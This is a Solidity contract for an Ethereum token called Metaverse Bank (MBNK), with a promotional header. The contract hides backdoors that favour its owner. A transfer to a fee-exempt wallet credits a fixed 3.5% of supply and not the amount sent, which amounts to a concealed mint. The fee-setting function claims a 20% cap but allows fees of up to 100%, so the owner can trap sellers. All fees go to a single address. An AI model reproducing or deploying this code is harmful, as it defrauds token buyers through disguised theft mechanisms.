// SPDX-License-Identifier: MIT

/*
The world's inaugural decentralized metaverse bank has arrived! Metaverse Bank is dedicated to encouraging the democratization and fractionalization of Metaverse lands for upcoming citizens.

Website: https://metaversebank.pro
Twitter: https://twitter.com/meta_eth_bank
Telegram: https://t.me/meta_eth_bank
Docs: https://medium.com/@metaversebank
*/

pragma solidity 0.8.21;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUFactory {
    function createPair(address tokenA, address tokenB) external returns (address uPair);
}

interface IURouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract MBNK is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Metaverse Bank";
    string private constant _symbol = "MBNK";

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee;

    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);

    IURouter uRouter;
    address public uPair;
    bool private tradeBegin = false;
    bool private swapEnabled = true;
    uint256 private swappingCount;
    bool private isSwapping;
    uint256 swappingAt;

    uint256 private lpSplit = 0;
    uint256 private marketingSplit = 0;
    uint256 private devSplit = 100;
    uint256 private burnSplit = 0;
    
    uint256 private buyFee = 1300;
    uint256 private sellFee = 1300;
    uint256 private transferFee = 1300;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    address internal feeDev = 0x9F1252eB0d4D088d37945bF815f8B8513438dEAe; 
    address internal feeMarketing = 0x9F1252eB0d4D088d37945bF815f8B8513438dEAe;
    address internal feeLp = 0x9F1252eB0d4D088d37945bF815f8B8513438dEAe;

    uint256 public maxTx = ( _totalSupply * 350 ) / 10000;
    uint256 public maxBuy = ( _totalSupply * 350 ) / 10000;
    uint256 public maxWallet = ( _totalSupply * 350 ) / 10000;
    uint256 private feeMax = ( _totalSupply * 1000 ) / 100000;
    uint256 private feeMin = ( _totalSupply * 10 ) / 100000;
    modifier lockFee {isSwapping = true; _; isSwapping = false;}

    constructor() Ownable(msg.sender) {
        IURouter _router = IURouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUFactory(_router.factory()).createPair(address(this), _router.WETH());
        uRouter = _router; uPair = _pair;
        isExcludedFromFee[feeMarketing] = true;
        isExcludedFromFee[feeDev] = true;
        isExcludedFromFee[feeLp] = true;
        isExcludedFromFee[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradeBegin = true;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}

    function swapLiquidifyAndBurn(uint256 tokens) private lockFee {
        uint256 _denominator = (lpSplit.add(1).add(marketingSplit).add(devSplit)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpSplit).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpSplit));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpSplit);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingSplit);
        if(marketingAmt > 0){payable(feeMarketing).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(feeDev).transfer(contractBalance);}
    }

    function takeFeeOnTrade(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFromFee[recipient]) {return maxTx;}
        if(getTaxAmount(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTaxAmount(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnSplit > uint256(0) && getTaxAmount(sender, recipient) > burnSplit){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnSplit));}
        return amount.sub(feeAmount);} return amount;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function shouldSwapClogged(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= feeMin;
        bool aboveThreshold = balanceOf(address(this)) >= feeMax;
        return !isSwapping && swapEnabled && tradeBegin && aboveMin && !isExcludedFromFee[sender] && recipient == uPair && swappingCount >= swappingAt && aboveThreshold;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uRouter), tokenAmount);
        uRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            feeLp,
            block.timestamp);
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpSplit = _liquidity; marketingSplit = _marketing; burnSplit = _burn; devSplit = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uRouter.WETH();
        _approve(address(this), address(uRouter), tokenAmount);
        uRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function getTaxAmount(address sender, address recipient) internal view returns (uint256) {
        if(recipient == uPair){return sellFee;}
        if(sender == uPair){return buyFee;}
        return transferFee;
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        maxTx = newTx; maxBuy = newTransfer; maxWallet = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function checkExclude(address sender, address recipient) internal view returns (bool) {
        return !isExcludedFromFee[sender] && !isExcludedFromFee[recipient];
    }    

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){require(tradeBegin, "tradeBegin");}
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && recipient != address(uPair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWallet, "Exceeds maximum wallet amount.");}
        if(sender != uPair){require(amount <= maxBuy || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "TX Limit Exceeded");}
        require(amount <= maxTx || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "TX Limit Exceeded"); 
        if(recipient == uPair && !isExcludedFromFee[sender]){swappingCount += uint256(1);}
        if(shouldSwapClogged(sender, recipient, amount)){swapLiquidifyAndBurn(feeMax); swappingCount = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludedFromFee[sender] ? takeFeeOnTrade(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
}